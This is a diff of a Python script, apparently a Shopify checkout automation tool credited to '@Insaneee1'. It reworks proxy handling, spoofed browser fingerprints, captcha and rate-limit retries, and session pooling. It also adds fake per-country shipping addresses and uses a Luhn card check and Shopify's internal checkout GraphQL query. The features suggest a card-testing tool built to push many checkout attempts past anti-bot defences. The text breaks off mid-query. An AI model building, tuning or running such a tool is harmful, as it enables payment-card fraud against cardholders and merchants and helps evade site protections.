@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+# Shopify Checkout API  |  endpoint: /shopify  |  Dev: @Insaneee1
 import os
 import re
 import sys
@@ -45,34 +47,51 @@ PER_USER_CONCUR   = _env_int("PER_USER_CONCUR", 100000)
 
 MAX_RETRIES       = _env_int("MAX_RETRIES", 1)
 CAPTCHA_RETRY     = _env_int("CAPTCHA_RETRY", 1)
-NET_RETRIES       = _env_int("NET_RETRIES", 3)
-RL_RETRIES        = _env_int("RL_RETRIES", 3)
-CONNECT_RETRY     = _env_int("CONNECT_RETRY", 3)
+NET_RETRIES       = _env_int("NET_RETRIES", 2)
+RL_RETRIES        = _env_int("RL_RETRIES", 1)
+CONNECT_RETRY     = _env_int("CONNECT_RETRY", 2)
 
-REQ_TOTAL_TIMEOUT = _env_float("REQ_TOTAL_TIMEOUT", 30)
-START_STAGGER     = _env_float("START_STAGGER", 0.0)
-FORCE_CLOSE       = _env_bool("FORCE_CLOSE", False)
+REQ_TOTAL_TIMEOUT = _env_float("REQ_TOTAL_TIMEOUT", 15)
+SOCK_CONNECT      = _env_float("SOCK_CONNECT", 6)
+SOCK_READ         = _env_float("SOCK_READ", 12)
+
 SITE_CACHE_TTL    = _env_float("SITE_CACHE_TTL", 1800)
 FINGERPRINT_MODE  = os.environ.get("FINGERPRINT_MODE", "fixed").strip().lower()
-ROTATE            = _env_bool("ROTATE", True)
 SLIM_MODE         = _env_bool("SLIM", True)
 LUHN_CHECK        = _env_bool("LUHN", False)
 
-PROXY_COOLDOWN      = _env_float("PROXY_COOLDOWN", 20)
-PROXY_RL_COOLDOWN   = _env_float("PROXY_RL_COOLDOWN", 45)
-SITE_PROXY_COOLDOWN = _env_float("SITE_PROXY_COOLDOWN", 120)
-HOST_MIN_GAP        = _env_float("HOST_MIN_GAP", 0.005)
-RL_PAUSE            = _env_float("RL_PAUSE", 2.0)
-SEEN_MAX            = _env_int("SEEN_MAX", 60000)
-POLL_MAX_SLEEP      = 0.6
+PROXY_COOLDOWN      = _env_float("PROXY_COOLDOWN", 8)
+PROXY_RL_COOLDOWN   = _env_float("PROXY_RL_COOLDOWN", 20)
+SITE_PROXY_COOLDOWN = _env_float("SITE_PROXY_COOLDOWN", 60)
+HOST_MIN_GAP        = _env_float("HOST_MIN_GAP", 0.0)
+RL_PAUSE            = _env_float("RL_PAUSE", 0.9)
+POLL_MAX_SLEEP      = 0.35
+SESSION_IDLE        = 120
+SESSION_MAX         = 256
 
-API_VERSIONS = ["2025-01", "2024-10", "2024-07", "2024-01"]
+API_VERSIONS = ["2025-01", "2024-10"]
 
 log = logging.getLogger("shopify")
 logging.basicConfig(level=logging.INFO,
                     format="%(asctime)s %(levelname)s %(message)s")
 
 SLIM = {"on": bool(SLIM_MODE)}
+_SITE_VARIANT = {}
+
+
+def _variant_for(host):
+    return _SITE_VARIANT.get(host) or ("slim" if SLIM["on"] else "full")
+
+
+def _q_for(host, full, slim):
+    return slim if _variant_for(host) == "slim" else full
+
+
+def _flip_variant(host):
+    nxt = "full" if _variant_for(host) == "slim" else "slim"
+    _SITE_VARIANT[host] = nxt
+    return nxt
+
 
 _DRIFT_MARKS = (
     "no longer supported",
@@ -86,6 +105,10 @@ _DRIFT_MARKS = (
     "unknown argument",
     "is not a valid type",
     "field is not supported",
+    "can't be made directly on",
+    "cannot be made directly on",
+    "must have a selection of subfields",
+    "field must have a selection",
 )
 
 
@@ -96,25 +119,12 @@ def _schema_drift(txt):
     return any(m in low for m in _DRIFT_MARKS)
 
 
-def _q(full, slim):
-    return slim if SLIM["on"] else full
-
-
 def _gql_balanced(q):
     return q.count("{") == q.count("}") and q.count("(") == q.count(")")
 
 
-def _check_queries():
-    for name, q in (("proposal_slim", QUERY_PROPOSAL_SLIM),
-                    ("submit_slim", MUTATION_SUBMIT_SLIM),
-                    ("poll_slim", QUERY_POLL_SLIM)):
-        if not _gql_balanced(q):
-            log.error("[QUERY] %s imbalance: {=%d }=%d (=%d )=%d",
-                      name, q.count("{"), q.count("}"), q.count("("), q.count(")"))
-
-
-_WIN   = "Windows NT 10.0; Win64; x64"
-_MAC   = "Macintosh; Intel Mac OS X 10_15_7"
+_WIN = "Windows NT 10.0; Win64; x64"
+_MAC = "Macintosh; Intel Mac OS X 10_15_7"
 _LINUX = "X11; Linux x86_64"
 
 
@@ -142,13 +152,10 @@ def _fp_edge(version, platform_ua, platform_hint):
 
 def _build_fp_pool():
     pool = []
-    for v in range(120, 132):
+    for v in range(128, 133):
         pool.append(_fp_chrome(v, _WIN, "Windows"))
-    for v in range(122, 132):
         pool.append(_fp_chrome(v, _MAC, "macOS"))
-    for v in range(124, 132):
-        pool.append(_fp_chrome(v, _LINUX, "Linux"))
-    for v in (126, 127, 128, 129, 130, 131):
+    for v in (129, 130, 131):
         pool.append(_fp_edge(v, _WIN, "Windows"))
     return pool
 
@@ -170,74 +177,11 @@ def new_fingerprint():
     return FIXED_FP
 
 
-PROXY_POOL = []
+# ── proxy state (per request only, no pool file) ─────────────────────────────
 _cooldown_proxies = {}
 _pcool_mem = {}
-_last_used = {}
-_site_proxy_cool = {}
 _proxy_failures = {}
-
-_SEEN_PROXIES = set()
-_SEEN_LIST = []
-
-_last_prune = 0.0
-
-
-def _load_proxy_pool():
-    out = []
-    for path in ("proxies.txt",
-                 os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")):
-        if os.path.isfile(path):
-            try:
-                with open(path, "r", encoding="utf-8", errors="ignore") as fh:
-                    for line in fh:
-                        line = line.strip()
-                        if line and not line.startswith("#"):
-                            out.append(line)
-            except OSError:
-                pass
-            break
-    return out
-
-
-PROXY_POOL = _load_proxy_pool()
-
-
-def _seen_proxy(p):
-    if not p:
-        return
-    if p in _SEEN_PROXIES:
-        return
-    _SEEN_PROXIES.add(p)
-    _SEEN_LIST.append(p)
-    if len(_SEEN_LIST) > SEEN_MAX:
-        cut = len(_SEEN_LIST) // 5
-        drop = _SEEN_LIST[:cut]
-        del _SEEN_LIST[:cut]
-        for d in drop:
-            _SEEN_PROXIES.discard(d)
-        _prune_cooldowns()
-
-
-def _prune_cooldowns():
-    global _last_prune
-    now = time.time()
-    if now - _last_prune < 60:
-        return
-    _last_prune = now
-    for d in (_cooldown_proxies, _pcool_mem, _last_used):
-        for k in [k for k, v in d.items() if v <= now]:
-            d.pop(k, None)
-    for site in list(_site_proxy_cool.keys()):
-        live = {p: e for p, e in _site_proxy_cool[site].items() if e > now}
-        if live:
-            _site_proxy_cool[site] = live
-        else:
-            _site_proxy_cool.pop(site, None)
-
-
-def _pool():
-    return PROXY_POOL if PROXY_POOL else _SEEN_LIST
+_site_proxy_cool = {}
 
 
 def _pcool_is_bad(p, now=None):
@@ -262,55 +206,16 @@ def _cooldown_proxy(p, secs=None):
         _cooldown_proxies[p] = time.time() + (PROXY_COOLDOWN if secs is None else secs)
 
 
-def _cooldown_site_proxy(site, p):
-    if not site or not p:
-        return
-    key = urlparse(site).netloc if site.startswith("http") else site
-    _site_proxy_cool.setdefault(key, {})[p] = time.time() + SITE_PROXY_COOLDOWN
-
-
 def _mark_proxy_fail(p):
-    if not p:
-        return
-    _proxy_failures[p] = _proxy_failures.get(p, 0) + 1
+    if p:
+        _proxy_failures[p] = _proxy_failures.get(p, 0) + 1
 
 
-def _rotate_proxy(cur):
-    if not ROTATE:
-        return None
-    pool = _pool()
-    if not pool:
-        return None
+def _prune_cooldowns():
     now = time.time()
-    for _ in range(14):
-        p = random.choice(pool)
-        if p == cur:
-            continue
-        if _pcool_is_bad(p, now):
-            continue
-        if _cooldown_proxies.get(p, 0) > now:
-            continue
-        return p
-    for _ in range(10):
-        p = random.choice(pool)
-        if p != cur:
-            return p
-    if len(pool) == 1 and pool[0] == cur:
-        return None
-    return None
-
-
-def _auto_proxy():
-    pool = _pool()
-    if not pool:
-        return None
-    now = time.time()
-    for _ in range(14):
-        p = random.choice(pool)
-        if _pcool_is_bad(p, now) or _cooldown_proxies.get(p, 0) > now:
-            continue
-        return p
-    return random.choice(pool)
+    for d in (_cooldown_proxies, _pcool_mem):
+        for k in [k for k, v in d.items() if v <= now]:
+            d.pop(k, None)
 
 
 def parse_proxy(proxy_str):
@@ -373,13 +278,10 @@ def build_connector(proxy_url=None):
             raise RuntimeError("SOCKS proxy needs: pip install aiohttp-socks") from exc
         return ProxyConnector.from_url(proxy_url, rdns=True, ssl=False), None
 
-    if FORCE_CLOSE:
-        conn = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0, force_close=True)
-    else:
-        conn = aiohttp.TCPConnector(
-            ssl=False, limit=0, limit_per_host=0,
-            ttl_dns_cache=300, keepalive_timeout=30, enable_cleanup_closed=True,
-        )
+    conn = aiohttp.TCPConnector(
+        ssl=False, limit=0, limit_per_host=0,
+        ttl_dns_cache=300, keepalive_timeout=45, enable_cleanup_closed=True,
+    )
     return conn, proxy_url
 
 
@@ -391,6 +293,54 @@ def proxy_status_label(pstr, purl, dead=False):
     return "Live"
 
 
+# ── session pool (keeps TLS alive per proxy) ─────────────────────────────────
+_SESSIONS = {}
+
+
+async def _sweep_sessions():
+    now = time.time()
+    for k, ent in list(_SESSIONS.items()):
+        if now - ent[1] > SESSION_IDLE:
+            _SESSIONS.pop(k, None)
+            try:
+                await ent[0].close()
+            except Exception:
+                pass
+
+
+async def _sess(purl):
+    key = purl or "__direct__"
+    ent = _SESSIONS.get(key)
+    if ent and not ent[0].closed:
+        ent[1] = time.time()
+        return ent[0], ent[2]
+    conn, parg = build_connector(purl)
+    s = aiohttp.ClientSession(
+        connector=conn,
+        timeout=aiohttp.ClientTimeout(total=REQ_TOTAL_TIMEOUT,
+                                      sock_connect=SOCK_CONNECT,
+                                      sock_read=SOCK_READ),
+        auto_decompress=True,
+    )
+    if len(_SESSIONS) >= SESSION_MAX:
+        await _sweep_sessions()
+    _SESSIONS[key] = [s, time.time(), parg]
+    return s, parg
+
+
+class _SessCtx:
+    def __init__(self, purl):
+        self.purl = purl
+
+    async def __aenter__(self):
+        self.session, self.proxy = await _sess(self.purl)
+        return self
+
+    async def __aexit__(self, *a):
+        return False
+
+
+# ── error classification ─────────────────────────────────────────────────────
 def is_proxy_err(exc):
     msg = str(exc).lower()
     return any(x in msg for x in (
@@ -405,12 +355,10 @@ _NET_MARKS = (
     "timeout", "timed out", "eof", "broken pipe", "cannot connect", "clientconnect",
     "proxy", "unreachable", "network", "remotedisconnected", "pci_token",
     "api http error 502", "api http error 503", "api http error 504",
-    "cart failed", "checkout_session_failed",
+    "cart failed", "checkout_session_failed", "connector",
 )
 
-_RL_MARKS = (
-    "rate_limited", "rate limit", "throttl", "too many", "429", "queue token",
-)
+_RL_MARKS = ("rate_limited", "rate limit", "throttl", "too many", "429", "queue token")
 
 
 def _is_net_err(msg):
@@ -430,7 +378,7 @@ def _is_captcha_msg(msg):
 _RETRYABLE = ("required_artifacts", "artifacts_unavailable", "stale_artifact",
               "signature_mismatch", "checkpoint_data_invalid",
               "unparseable", "generic_error", "negotiation failed",
-              "schema_drift")
+              "schema_drift", "graphql_syntax")
 
 
 def _is_retryable(msg):
@@ -439,14 +387,6 @@ def _is_retryable(msg):
 
 
 _RL_PAUSE_UNTIL = 0.0
-_RL_LOCK = None
-
-
-def _rl_lock():
-    global _RL_LOCK
-    if _RL_LOCK is None:
-        _RL_LOCK = asyncio.Lock()
-    return _RL_LOCK
 
 
 def _rl_pause(secs=None):
@@ -457,43 +397,33 @@ def _rl_pause(secs=None):
 
 
 async def _rl_wait():
-    if _RL_PAUSE_UNTIL <= time.time():
-        return
-    async with _rl_lock():
-        now = time.time()
-        if _RL_PAUSE_UNTIL > now:
-            await asyncio.sleep(_RL_PAUSE_UNTIL - now)
+    now = time.time()
+    if _RL_PAUSE_UNTIL > now:
+        await asyncio.sleep(_RL_PAUSE_UNTIL - now)
 
 
-_host_last = {}
-_host_locks = {}
+_HOST_LAST = {}
 
 
 async def _host_pace(host, gap=None):
-    if not host:
-        return
     gap = HOST_MIN_GAP if gap is None else gap
-    if gap <= 0:
+    if gap <= 0 or not host:
         return
-    lock = _host_locks.get(host)
-    if lock is None:
-        lock = _host_locks[host] = asyncio.Lock()
-    async with lock:
-        now = time.time()
-        wait = gap - (now - _host_last.get(host, 0.0))
-        if wait > 0:
-            await asyncio.sleep(wait)
-            now = time.time()
-        _host_last[host] = now
+    now = time.time()
+    wait = gap - (now - _HOST_LAST.get(host, 0.0))
+    if wait > 0:
+        await asyncio.sleep(wait)
+    _HOST_LAST[host] = time.time()
 
 
+# ── address book ────────────────────────────────────────────────────────────
 C2C = {
     "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB",
     "CHF": "CH", "EUR": "DE", "AUD": "AU", "NZD": "NZ", "JPY": "JP", "SGD": "SG",
     "SEK": "SE", "NOK": "NO", "DKK": "DK", "PLN": "PL", "CZK": "CZ", "MXN": "MX",
     "BRL": "BR", "KRW": "KR", "THB": "TH", "MYR": "MY", "PHP": "PH", "IDR": "ID",
     "TWD": "TW", "ZAR": "ZA", "ILS": "IL", "TRY": "TR", "SAR": "SA", "QAR": "QA",
-    "KWD": "KW", "CNY": "CN", "HUF": "HU", "RON": "RO", "BGN": "BG", "CLP": "CL",
+    "CNY": "CN", "HUF": "HU", "RON": "RO", "BGN": "BG", "CLP": "CL",
     "COP": "CO", "PEN": "PE", "ARS": "AR",
 }
 
@@ -536,30 +466,43 @@ book = {
            "zoneCode": "CDMX", "countryCode": "MX", "phone": "5512345678"},
     "BR": {"address1": "Av Paulista 1000", "city": "Sao Paulo", "postalCode": "01310-100",
            "zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
+    "IE": {"address1": "1 Grafton Street", "city": "Dublin", "postalCode": "D02 XY45",
+           "zoneCode": "D", "countryCode": "IE", "phone": "16123456"},
+    "IT": {"address1": "Via Roma 1", "city": "Milano", "postalCode": "20121",
+           "zoneCode": "MI", "countryCode": "IT", "phone": "0212345678"},
+    "ES": {"address1": "Calle Mayor 1", "city": "Madrid", "postalCode": "28013",
+           "zoneCode": "MD", "countryCode": "ES", "phone": "911234567"},
+    "NL": {"address1": "Damrak 1", "city": "Amsterdam", "postalCode": "1012",
+           "zoneCode": "NH", "countryCode": "NL", "phone": "201234567"},
+    "PT": {"address1": "Rua Augusta 1", "city": "Lisboa", "postalCode": "1100-053",
+           "zoneCode": "LI", "countryCode": "PT", "phone": "211234567"},
+    "PL": {"address1": "Marszalkowska 1", "city": "Warszawa", "postalCode": "00-001",
+           "zoneCode": "MZ", "countryCode": "PL", "phone": "221234567"},
+    "CZ": {"address1": "Vaclavske namesti 1", "city": "Praha", "postalCode": "11000",
+           "zoneCode": "PR", "countryCode": "CZ", "phone": "221234567"},
+    "TH": {"address1": "Sukhumvit 1", "city": "Bangkok", "postalCode": "10110",
+           "zoneCode": "BKK", "countryCode": "TH", "phone": "21234567"},
+    "MY": {"address1": "Jalan Bukit Bintang 1", "city": "Kuala Lumpur", "postalCode": "55100",
+           "zoneCode": "KUL", "countryCode": "MY", "phone": "312345678"},
+    "ID": {"address1": "Jalan Sudirman 1", "city": "Jakarta", "postalCode": "10220",
+           "zoneCode": "JK", "countryCode": "ID", "phone": "2112345678"},
+    "PH": {"address1": "Ayala Avenue 1", "city": "Makati", "postalCode": "1226",
+           "zoneCode": "NCR", "countryCode": "PH", "phone": "212345678"},
+    "KR": {"address1": "Gangnam-daero 1", "city": "Seoul", "postalCode": "06236",
+           "zoneCode": "KR-11", "countryCode": "KR", "phone": "212345678"},
+    "TW": {"address1": "Xinyi Road 1", "city": "Taipei", "postalCode": "110",
+           "zoneCode": "TPE", "countryCode": "TW", "phone": "212345678"},
+    "ZA": {"address1": "Long Street 1", "city": "Cape Town", "postalCode": "8001",
+           "zoneCode": "WC", "countryCode": "ZA", "phone": "211234567"},
+    "IL": {"address1": "Rothschild 1", "city": "Tel Aviv", "postalCode": "6688101",
+           "zoneCode": "TA", "countryCode": "IL", "phone": "312345678"},
+    "TR": {"address1": "Istiklal 1", "city": "Istanbul", "postalCode": "34430",
+           "zoneCode": "IST", "countryCode": "TR", "phone": "2121234567"},
+    "SA": {"address1": "King Fahd Road 1", "city": "Riyadh", "postalCode": "12271",
+           "zoneCode": "RD", "countryCode": "SA", "phone": "112345678"},
     "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080",
                 "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
 }
-
-_EXTRA_BOOK = {
-    "IE": {"address1": "1 Grafton Street", "city": "Dublin", "postalCode": "D02 XY45", "zoneCode": "D", "countryCode": "IE", "phone": "16123456"},
-    "IT": {"address1": "Via Roma 1", "city": "Milano", "postalCode": "20121", "zoneCode": "MI", "countryCode": "IT", "phone": "0212345678"},
-    "ES": {"address1": "Calle Mayor 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "MD", "countryCode": "ES", "phone": "911234567"},
-    "NL": {"address1": "Damrak 1", "city": "Amsterdam", "postalCode": "1012", "zoneCode": "NH", "countryCode": "NL", "phone": "201234567"},
-    "PT": {"address1": "Rua Augusta 1", "city": "Lisboa", "postalCode": "1100-053", "zoneCode": "LI", "countryCode": "PT", "phone": "211234567"},
-    "PL": {"address1": "Marszalkowska 1", "city": "Warszawa", "postalCode": "00-001", "zoneCode": "MZ", "countryCode": "PL", "phone": "221234567"},
-    "CZ": {"address1": "Vaclavske namesti 1", "city": "Praha", "postalCode": "11000", "zoneCode": "PR", "countryCode": "CZ", "phone": "221234567"},
-    "TH": {"address1": "Sukhumvit 1", "city": "Bangkok", "postalCode": "10110", "zoneCode": "BKK", "countryCode": "TH", "phone": "21234567"},
-    "MY": {"address1": "Jalan Bukit Bintang 1", "city": "Kuala Lumpur", "postalCode": "55100", "zoneCode": "KUL", "countryCode": "MY", "phone": "312345678"},
-    "ID": {"address1": "Jalan Sudirman 1", "city": "Jakarta", "postalCode": "10220", "zoneCode": "JK", "countryCode": "ID", "phone": "2112345678"},
-    "PH": {"address1": "Ayala Avenue 1", "city": "Makati", "postalCode": "1226", "zoneCode": "NCR", "countryCode": "PH", "phone": "212345678"},
-    "KR": {"address1": "Gangnam-daero 1", "city": "Seoul", "postalCode": "06236", "zoneCode": "KR-11", "countryCode": "KR", "phone": "212345678"},
-    "TW": {"address1": "Xinyi Road 1", "city": "Taipei", "postalCode": "110", "zoneCode": "TPE", "countryCode": "TW", "phone": "212345678"},
-    "ZA": {"address1": "Long Street 1", "city": "Cape Town", "postalCode": "8001", "zoneCode": "WC", "countryCode": "ZA", "phone": "211234567"},
-    "IL": {"address1": "Rothschild 1", "city": "Tel Aviv", "postalCode": "6688101", "zoneCode": "TA", "countryCode": "IL", "phone": "312345678"},
-    "TR": {"address1": "Istiklal 1", "city": "Istanbul", "postalCode": "34430", "zoneCode": "IST", "countryCode": "TR", "phone": "2121234567"},
-    "SA": {"address1": "King Fahd Road 1", "city": "Riyadh", "postalCode": "12271", "zoneCode": "RD", "countryCode": "SA", "phone": "112345678"},
-}
-book.update(_EXTRA_BOOK)
 
 FALLBACK_COUNTRIES = ["US", "GB", "CA", "AU", "SG", "DE", "FR", "IE", "IT", "ES",
                       "NL", "NZ", "IN", "AE", "HK", "JP", "SE", "DK", "NO", "PL"]
@@ -588,7 +531,7 @@ def pick_addr(url, cc=None, rc=None, overrides=None):
     return base
 
 
-def _country_candidates(ourl, currency, overrides, cap=6):
+def _country_candidates(ourl, currency, overrides, cap=4):
     if overrides and overrides.get("countryCode"):
         return [str(overrides["countryCode"]).upper()]
     order = []
@@ -628,6 +571,7 @@ def _apply_addr_to_vars(variables, addr, fn, ln):
         pass
 
 
+# ── parsing helpers ─────────────────────────────────────────────────────────
 def extract_between(text, start, end):
     if not text or not start or not end:
         return None
@@ -839,6 +783,7 @@ def clean_resp(message):
     return m[:80]
 
 
+# ── product fetch ───────────────────────────────────────────────────────────
 PRODUCTS_Q = ("query FetchProducts($first:Int!){products(first:$first){edges{node{handle "
               "variants(first:50){edges{node{id availableForSale requiresShipping "
               "price{amount}}}}}}}}")
@@ -911,7 +856,7 @@ async def _gql_products(session, domain, ver, proxy, headers):
     url = f"{domain}/api/{ver}/graphql.json"
     async with session.post(url, json={"query": PRODUCTS_Q, "variables": {"first": 100}},
                             headers={**headers, "Content-Type": "application/json"},
-                            proxy=proxy, timeout=12) as r:
+                            proxy=proxy) as r:
         if r.status != 200:
             return None, f"status {r.status}"
         try:
@@ -925,7 +870,7 @@ async def _gql_products(session, domain, ver, proxy, headers):
 
 async def _json_products(session, domain, proxy, headers):
     try:
-        async with session.get(f"{domain}/products.json", proxy=proxy, timeout=12,
+        async with session.get(f"{domain}/products.json", proxy=proxy,
                                headers={"User-Agent": headers["User-Agent"],
                                         "Accept": "*/*"}) as r:
             if r.status != 200:
@@ -951,10 +896,8 @@ async def fetch_products(domain, proxy_str=None, session=None, request_proxy=Non
         own = session is None
         if own:
             purl = parse_proxy(proxy_str) if proxy_str else None
-            conn, request_proxy = build_connector(purl)
-            session = aiohttp.ClientSession(connector=conn,
-                                            timeout=aiohttp.ClientTimeout(total=15),
-                                            headers=headers)
+            ctx = _SessCtx(purl)
+            session, request_proxy = await ctx.__aenter__()
         try:
             last_err = None
             for attempt in range(CONNECT_RETRY):
@@ -978,54 +921,119 @@ async def fetch_products(domain, proxy_str=None, session=None, request_proxy=Non
                     return False, ("Storefront GraphQL failed" if last_err else "No Valid Products")
                 except (aiohttp.ClientError, OSError) as e:
                     last_err = e
-                    await asyncio.sleep(0.15 * (attempt + 1))
+                    await asyncio.sleep(0.1 * (attempt + 1))
                     continue
             return False, f"Proxy Error: {last_err}"
         finally:
             if own:
-                await session.close()
+                pass
     except (aiohttp.ClientError, OSError) as e:
         return False, f"Proxy Error: {e}"
     except Exception as e:
         return False, f"error: {e}"
 
 
+# ── GraphQL documents ───────────────────────────────────────────────────────
 QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound 